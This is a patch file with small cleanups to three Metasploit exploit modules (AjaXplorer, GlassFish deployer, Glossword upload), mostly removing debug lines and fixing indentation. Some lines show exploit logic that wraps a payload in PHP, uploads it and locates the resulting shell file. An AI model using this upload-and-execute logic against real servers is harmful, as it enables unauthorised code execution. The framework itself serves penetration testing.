@@ -1,0 +1,48 @@
+diff -rua --unidirectional-new-file metasploit-framework/modules/exploits/multi/http/ajaxplorer_checkinstall_exec.rb metasploit-framework2/modules/exploits/multi/http/ajaxplorer_checkinstall_exec.rb
+--- metasploit-framework/modules/exploits/multi/http/ajaxplorer_checkinstall_exec.rb	2013-08-10 18:57:59.000000000 -0400
++++ metasploit-framework2/modules/exploits/multi/http/ajaxplorer_checkinstall_exec.rb	2013-08-10 18:28:01.000000000 -0400
+@@ -70,7 +70,6 @@
+ 		})
+ 
+ 		# If the server doesn't return the default redirection, probably something is wrong
+-          print_status("The server returned: #{res.code} #{res.message} #{res.inspect}")
+ 		if res and res.code == 200 and res.body =~ /#{clue}/
+ 			return Exploit::CheckCode::Vulnerable
+ 		end
+diff -rua --unidirectional-new-file metasploit-framework/modules/exploits/multi/http/glassfish_deployer.rb metasploit-framework2/modules/exploits/multi/http/glassfish_deployer.rb
+--- metasploit-framework/modules/exploits/multi/http/glassfish_deployer.rb	2013-08-10 18:57:59.000000000 -0400
++++ metasploit-framework2/modules/exploits/multi/http/glassfish_deployer.rb	2013-08-10 18:28:01.000000000 -0400
+@@ -570,7 +570,6 @@
+ 
+ 		#Print upload result
+ 		if res and res.code == 302
+-                #if res and ((res.code == 302) or (res.code == 400))  
+ 			print_status("Successfully uploaded")
+ 		else
+ 			print_error("Error uploading #{res.code}")
+diff -rua --unidirectional-new-file metasploit-framework/modules/exploits/multi/http/glossword_upload_exec.rb metasploit-framework2/modules/exploits/multi/http/glossword_upload_exec.rb
+--- metasploit-framework/modules/exploits/multi/http/glossword_upload_exec.rb	2013-08-10 18:57:59.000000000 -0400
++++ metasploit-framework2/modules/exploits/multi/http/glossword_upload_exec.rb	2013-08-10 18:28:35.000000000 -0400
+@@ -147,8 +147,7 @@
+ 		php = %Q|<?php #{payload.encoded} ?>|
+ 		begin
+ 			res = upload(base, sid, @fname, php)
+-                        #if res and res.code == 301 and res['location'] =~ /Setting saved/
+-                        if res and res.code == 200
++			if res and res.code == 301 and res['location'] =~ /Setting saved/
+ 				print_good("#{@peer} - File uploaded successfully")
+ 			else
+ 				fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Uploading PHP payload failed")
+@@ -168,10 +167,8 @@
+ 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+ 			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
+ 		end
+-         
+-              if res and res.code == 200 and res.body =~ /<img width="" height="" src="([^"]+)"/
+-                
+-                        shell_uri = "#{$1}"
++		if res and res.code == 200 and res.body =~ /<img width="" height="" src="([^"]+)"/
++			shell_uri = "#{$1}"
+ 			@fname    = shell_uri.match('(\d+_[a-zA-Z\d]+\.php)')
+ 			print_good("#{@peer} - Found payload file path (#{shell_uri})")
+ 		else
